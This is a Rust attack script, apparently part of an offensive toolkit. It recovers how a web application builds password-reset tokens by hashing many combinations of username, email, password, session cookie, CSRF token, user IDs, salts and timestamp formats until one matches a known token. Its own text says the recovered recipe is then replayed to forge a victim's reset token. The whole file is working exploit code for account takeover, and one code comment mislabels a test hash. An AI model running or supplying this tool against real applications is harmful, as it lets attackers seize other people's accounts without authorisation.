#!/usr/bin/env rust-script
//! name: ts4_sweep
//! description: Non-time seed battery for password-reset token reproduction - enumerates static identity-atom constructions (user, email, password, sha1(password), user ids, session cookie, csrf; singles, ordered pairs and triples, a wide separator set, secret-like prefixes/suffixes) plus a time-splice battery that interleaves a second/millisecond/microsecond timestamp form with one or two identity atoms in both orders; each candidate is hashed with SHA-1 and truncated SHA-256 and compared as raw bytes against the target token, so a deterministic or time-derived construction is recovered from a single known token (positive control) and can then be replayed for the victim.
//! version: 1.0.0
//! args: --target HEX --user U [--email E] [--pw P] [--session S] [--csrf C] [--uids 1,2] [--mode static|time|all] [--sec N] [--win-secs N] [--us-lo N --us-hi N] [--us-step N] [--only-atoms user,email] [--only-forms 0,3] [--only-seps ':',-] [--threads N] [--selftest]
//! keywords: reset token, non-time seed, time-sensitive, sha1, password reset, token forge, 时间敏感, 重置令牌
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! sha2 = "0.10"
//! hex = "0.4"
//! ```
use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use sha1::{Digest, Sha1};
use sha2::Sha256;
use std::collections::HashMap;
use std::fmt::Write as _;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

#[derive(Clone, Copy, Debug)]
enum Algo {
    Sha1,
    Sha256Trunc,
}
const ALGOS: [Algo; 2] = [Algo::Sha1, Algo::Sha256Trunc];

fn digest(a: Algo, data: &[u8]) -> [u8; 20] {
    match a {
        Algo::Sha1 => {
            let mut h = Sha1::new();
            h.update(data);
            let o = h.finalize();
            let mut d = [0u8; 20];
            d.copy_from_slice(&o);
            d
        }
        Algo::Sha256Trunc => {
            let mut h = Sha256::new();
            h.update(data);
            let o = h.finalize();
            let mut d = [0u8; 20];
            d.copy_from_slice(&o[..20]);
            d
        }
    }
}

fn algo_name(a: Algo) -> &'static str {
    match a {
        Algo::Sha1 => "sha1",
        Algo::Sha256Trunc => "sha256t20",
    }
}

const SEPS: [&str; 18] = [
    "", ":", "-", "_", ".", "|", "/", " ", "+", "&", "=", ",", "@", "*", "#", "~", "!", ";",
];
const SEPS_SHORT: [&str; 6] = ["", ":", "-", "_", ".", "|"];
const PRE: [&str; 8] = ["", "secret", "key", "reset", "forgot", "password", "salt", "account"];
const POST: [&str; 6] = ["", "secret", "key", "salt", "reset", "token"];

const N_FORMS: usize = 9;

fn time_str(form: usize, us: u64, out: &mut String) {
    out.clear();
    let sec = us / 1_000_000;
    let frac = us % 1_000_000;
    match form {
        0 => {
            let _ = write!(out, "{sec}");
        }
        1 => {
            let _ = write!(out, "{}", us / 1000);
        }
        2 => {
            let _ = write!(out, "{us}");
        }
        3 => {
            let _ = write!(out, "{sec}.{frac:06}");
        }
        4 => {
            let _ = write!(out, "{sec} {frac:06}");
        }
        5 => {
            let _ = write!(out, "{sec}.{:03}", frac / 1000);
        }
        6 => {
            // php microtime() default string "0.xxxxxxxx sec"
            let _ = write!(out, "0.{:08} {sec}", frac * 100);
        }
        7 => {
            // php (string)(float)microtime(true) at precision=14 -> 4 decimals here
            let _ = write!(out, "{sec}.{:04}", (frac + 50) / 100);
        }
        _ => {
            // php precision=17 -> 7 decimals here
            let _ = write!(out, "{sec}.{:07}", frac * 10);
        }
    }
}

#[derive(Clone, Copy, Debug)]
enum Recipe {
    TimeOnly {
        form: usize,
        pre: &'static str,
        post: &'static str,
    },
    WithTime {
        form: usize,
        a: Option<usize>,
        b: Option<usize>,
        time_first: bool,
        sep: &'static str,
        pre: &'static str,
        post: &'static str,
    },
}

fn build(rec: &Recipe, atoms: &[(String, String)], t: &str, buf: &mut String) {
    buf.clear();
    match rec {
        Recipe::TimeOnly { pre, post, .. } => {
            buf.push_str(pre);
            buf.push_str(t);
            buf.push_str(post);
        }
        Recipe::WithTime {
            a,
            b,
            time_first,
            sep,
            pre,
            post,
            ..
        } => {
            buf.push_str(pre);
            match (a, b) {
                (Some(ai), Some(bi)) => {
                    if *time_first {
                        buf.push_str(t);
                        buf.push_str(sep);
                        buf.push_str(&atoms[*ai].1);
                        buf.push_str(sep);
                        buf.push_str(&atoms[*bi].1);
                    } else {
                        buf.push_str(&atoms[*ai].1);
                        buf.push_str(sep);
                        buf.push_str(&atoms[*bi].1);
                        buf.push_str(sep);
                        buf.push_str(t);
                    }
                }
                (Some(ai), None) => {
                    if *time_first {
                        buf.push_str(t);
                        buf.push_str(sep);
                        buf.push_str(&atoms[*ai].1);
                    } else {
                        buf.push_str(&atoms[*ai].1);
                        buf.push_str(sep);
                        buf.push_str(t);
                    }
                }
                _ => {
                    buf.push_str(t);
                }
            }
            buf.push_str(post);
        }
    }
}

fn parse_kv(args: &[String]) -> Result<(HashMap<String, String>, bool), String> {
    let mut kv = HashMap::new();
    let mut selftest = false;
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if a == "--selftest" || a == "--no-salts" {
            if a == "--selftest" {
                selftest = true;
            }
            kv.insert(a.clone(), "1".into());
            i += 1;
            continue;
        }
        if a.starts_with("--") {
            if i + 1 >= args.len() {
                return Err(format!("missing value for {a}"));
            }
            kv.insert(a.clone(), args[i + 1].clone());
            i += 2;
        } else {
            i += 1;
        }
    }
    Ok((kv, selftest))
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if let Err(e) = run(&args) {
        let _ = report::failure("ts4_sweep", &e, "usage: ts4_sweep --target HEX --user U [--mode static|time|all]");
    }
}

fn run(args: &[String]) -> Result<(), String> {
    let (kv, selftest) = parse_kv(args)?;
    if selftest {
        let d = digest(Algo::Sha1, b"abc");
        let h = hex::encode(d);
        // empty-string sha1 a9993e364706816aba3e25717850c26c9cd0d89d
        if h != "a9993e364706816aba3e25717850c26c9cd0d89d" {
            return Err(format!("selftest sha1(abc) mismatch: {h}"));
        }
        let d2 = digest(Algo::Sha256Trunc, b"abc");
        let h2 = hex::encode(d2);
        if h2 != "ba7816bf8f01cfea414140de5dae2223b00361a3" {
            return Err(format!("selftest sha256t20(abc) mismatch: {h2}"));
        }
        let _ = report::success(
            "ts4_sweep",
            json!({"selftest": "ok", "sha1_abc": h, "sha256t20_abc": h2}),
            "run the battery with --target/--user/--sec",
        );
        return Ok(());
    }
    let target_hex = kv.get("--target").ok_or("--target required")?.to_lowercase();
    let tbytes = hex::decode(&target_hex).map_err(|e| format!("bad --target: {e}"))?;
    if tbytes.len() != 20 {
        return Err(format!("--target must be 40 hex chars (20 bytes), got {}", tbytes.len()));
    }
    let mut target = [0u8; 20];
    target.copy_from_slice(&tbytes);

    let user = kv.get("--user").cloned().unwrap_or_default();
    let email = kv.get("--email").cloned().unwrap_or_default();
    let pw = kv.get("--pw").cloned().unwrap_or_default();
    let session = kv.get("--session").cloned().unwrap_or_default();
    let csrf = kv.get("--csrf").cloned().unwrap_or_default();
    let host = kv.get("--host").cloned().unwrap_or_default();

    let mut atoms: Vec<(String, String)> = Vec::new();
    if !user.is_empty() {
        atoms.push(("user".into(), user.clone()));
    }
    if !email.is_empty() {
        atoms.push(("email".into(), email.clone()));
    }
    if !pw.is_empty() {
        atoms.push(("pw".into(), pw.clone()));
        let mut h = Sha1::new();
        h.update(pw.as_bytes());
        atoms.push(("sha1pw".into(), hex::encode(h.finalize())));
    }
    if !session.is_empty() {
        atoms.push(("session".into(), session.clone()));
    }
    if !csrf.is_empty() {
        atoms.push(("csrf".into(), csrf.clone()));
    }
    if !host.is_empty() {
        atoms.push(("host".into(), host.clone()));
    }
    match kv.get("--uids") {
        Some(s) => {
            for u in s.split(',') {
                if !u.is_empty() {
                    atoms.push((format!("uid{u}"), u.to_string()));
                }
            }
        }
        None => {
            for u in 1..=5u32 {
                atoms.push((format!("uid{u}"), u.to_string()));
            }
        }
    }
    if atoms.is_empty() {
        return Err("at least one identity atom required (--user/--email/--pw/--session/--csrf/--uids)".into());
    }

    let mode = kv.get("--mode").cloned().unwrap_or_else(|| "all".into());
    let threads: usize = kv.get("--threads").and_then(|v| v.parse().ok()).unwrap_or(6).max(1);
    let step: u64 = kv.get("--us-step").and_then(|v| v.parse().ok()).unwrap_or(1000).max(1);

    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let start = std::time::Instant::now();

    if mode == "static" || mode == "all" {
        let mut tested_n = 0usize;
        let mut local: Vec<Value> = Vec::new();
        let na = atoms.len();
        // singles
        for (la, a) in &atoms {
            for pre in PRE {
                for post in POST {
                    let s = format!("{pre}{a}{post}");
                    for algo in ALGOS {
                        tested_n += 1;
                        if digest(algo, s.as_bytes()) == target {
                            local.push(json!({"battery":"static","shape":"single","atoms":[la],"input":s,"algo":algo_name(algo)}));
                        }
                    }
                }
            }
        }
        // pairs (ordered, a may equal b)
        for (la, a) in &atoms {
            for (lb, b) in &atoms {
                for sep in SEPS {
                    let s = format!("{a}{sep}{b}");
                    for algo in ALGOS {
                        tested_n += 1;
                        if digest(algo, s.as_bytes()) == target {
                            local.push(json!({"battery":"static","shape":"pair","atoms":[la,lb],"sep":sep,"input":s,"algo":algo_name(algo)}));
                        }
                    }
                }
                for sep in SEPS_SHORT {
                    for pre in PRE {
                        for post in POST {
                            let s = format!("{pre}{a}{sep}{b}{post}");
                            for algo in ALGOS {
                                tested_n += 1;
                                if digest(algo, s.as_bytes()) == target {
                                    local.push(json!({"battery":"static","shape":"pair_salted","atoms":[la,lb],"sep":sep,"pre":pre,"post":post,"input":s,"algo":algo_name(algo)}));
                                }
                            }
                        }
                    }
                }
            }
        }
        // triples (distinct)
        for i in 0..na {
            for j in 0..na {
                if j == i {
                    continue;
                }
                for k in 0..na {
                    if k == i || k == j {
                        continue;
                    }
                    for s1 in SEPS_SHORT {
                        for s2 in SEPS_SHORT {
                            let s = format!("{}{s1}{}{s2}{}", atoms[i].1, atoms[j].1, atoms[k].1);
                            for algo in ALGOS {
                                tested_n += 1;
                                if digest(algo, s.as_bytes()) == target {
                                    local.push(json!({"battery":"static","shape":"triple","atoms":[atoms[i].0,atoms[j].0,atoms[k].0],"seps":[s1,s2],"input":s,"algo":algo_name(algo)}));
                                }
                            }
                        }
                    }
                }
            }
        }
        tested.fetch_add(tested_n, Ordering::Relaxed);
        hits.lock().unwrap().extend(local);
    }

    let mut window_info: Option<Value> = None;
    if mode == "time" || mode == "all" {
        let (us_lo, us_hi) = if let (Some(lo), Some(hi)) = (kv.get("--us-lo"), kv.get("--us-hi")) {
            (
                lo.parse::<u64>().map_err(|_| "bad --us-lo")?,
                hi.parse::<u64>().map_err(|_| "bad --us-hi")?,
            )
        } else if let Some(sec) = kv.get("--sec") {
            let s = sec.parse::<u64>().map_err(|_| "bad --sec")?;
            let w: u64 = kv.get("--win-secs").and_then(|v| v.parse().ok()).unwrap_or(3);
            ((s.saturating_sub(w)) * 1_000_000, (s + w) * 1_000_000 + 999_999)
        } else {
            return Err("time battery needs --sec or --us-lo/--us-hi".into());
        };
        // recipes
        let only_atoms: Option<Vec<String>> =
            kv.get("--only-atoms").map(|s| s.split(',').map(|x| x.trim().to_string()).collect());
        let only_forms: Option<Vec<usize>> = kv
            .get("--only-forms")
            .map(|s| s.split(',').filter_map(|x| x.trim().parse().ok()).collect());
        let only_seps: Option<Vec<String>> =
            kv.get("--only-seps").map(|s| s.split(',').map(|x| x.to_string()).collect());
        let atom_idx: Vec<usize> = atoms
            .iter()
            .enumerate()
            .filter(|(_, (k, _))| only_atoms.as_ref().map_or(true, |l| l.contains(k)))
            .map(|(i, _)| i)
            .collect();
        let forms_l: Vec<usize> = (0..N_FORMS)
            .filter(|f| only_forms.as_ref().map_or(true, |l| l.contains(f)))
            .collect();
        let seps_l: Vec<&'static str> = SEPS
            .iter()
            .copied()
            .filter(|s| only_seps.as_ref().map_or(true, |l| l.iter().any(|x| x == s)))
            .collect();
        let seps_short_l: Vec<&'static str> = SEPS_SHORT
            .iter()
            .copied()
            .filter(|s| only_seps.as_ref().map_or(true, |l| l.iter().any(|x| x == s)))
            .collect();
        let salted = !kv.contains_key("--no-salts");
        let pre_list: Vec<&'static str> = if salted { PRE.to_vec() } else { vec![""] };
        let post_list: Vec<&'static str> = if salted { POST.to_vec() } else { vec![""] };
        let mut recipes: Vec<Recipe> = Vec::new();
        for form in forms_l.iter().copied() {
            for pre in pre_list.iter().copied() {
                for post in post_list.iter().copied() {
                    recipes.push(Recipe::TimeOnly { form, pre, post });
                }
            }
            for &ai in atom_idx.iter() {
                for time_first in [true, false] {
                    for sep in seps_l.iter().copied() {
                        recipes.push(Recipe::WithTime { form, a: Some(ai), b: None, time_first, sep, pre: "", post: "" });
                    }
                }
                if salted {
                    for time_first in [true, false] {
                        for sep in seps_short_l.iter().copied() {
                            for pre in PRE {
                                for post in POST {
                                    recipes.push(Recipe::WithTime { form, a: Some(ai), b: None, time_first, sep, pre, post });
                                }
                            }
                        }
                    }
                }
            }
            for &ai in atom_idx.iter() {
                for &bi in atom_idx.iter() {
                    if bi == ai {
                        continue;
                    }
                    for time_first in [true, false] {
                        for sep in seps_short_l.iter().copied() {
                            recipes.push(Recipe::WithTime { form, a: Some(ai), b: Some(bi), time_first, sep, pre: "", post: "" });
                        }
                    }
                }
            }
        }
        let recipes = Arc::new(recipes);
        let atoms_arc = Arc::new(atoms.clone());
        let total = us_hi - us_lo + 1;
        let chunk = total.div_ceil(threads as u64).max(1);
        let mut handles = Vec::new();
        for tid in 0..threads {
            let raw_from = us_lo + tid as u64 * chunk;
            if raw_from > us_hi {
                break;
            }
            let from = us_lo + (raw_from - us_lo).div_ceil(step) * step;
            let to = (raw_from + chunk - 1).min(us_hi);
            let recipes = recipes.clone();
            let atoms_t = atoms_arc.clone();
            let hits = hits.clone();
            let tested = tested.clone();
            handles.push(std::thread::spawn(move || {
                let mut local: Vec<Value> = Vec::new();
                let mut n = 0usize;
                let mut tbuf = String::with_capacity(48);
                let mut buf = String::with_capacity(160);
                for us in (from..=to).step_by(step as usize) {
                    for rec in recipes.iter() {
                        let form = match rec {
                            Recipe::TimeOnly { form, .. } => *form,
                            Recipe::WithTime { form, .. } => *form,
                        };
                        time_str(form, us, &mut tbuf);
                        build(rec, &atoms_t, &tbuf, &mut buf);
                        for algo in ALGOS {
                            n += 1;
                            if digest(algo, buf.as_bytes()) == target {
                                local.push(json!({"battery":"time","us":us,"form":form,"recipe":format!("{rec:?}"),"input":buf.clone(),"algo":algo_name(algo)}));
                            }
                        }
                    }
                }
                tested.fetch_add(n, Ordering::Relaxed);
                hits.lock().unwrap().extend(local);
            }));
        }
        for h in handles {
            let _ = h.join();
        }
        window_info = Some(json!({"us_lo": us_lo, "us_hi": us_hi, "step_us": step, "recipes": recipes.len(), "threads": threads}));
    }

    let hits = hits.lock().unwrap().clone();
    let data = json!({
        "target": target_hex,
        "atoms": atoms.iter().map(|(k, _)| k.clone()).collect::<Vec<_>>(),
        "mode": mode,
        "tested": tested.load(Ordering::Relaxed),
        "hits": hits,
        "window": window_info,
        "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hits.is_empty() {
        "no construction matched: widen the window/step or the construction is not identity+time"
    } else {
        "construction recovered: replay it for the victim at the victim request's time"
    };
    let _ = report::success("ts4_sweep", data, next);
    Ok(())
}
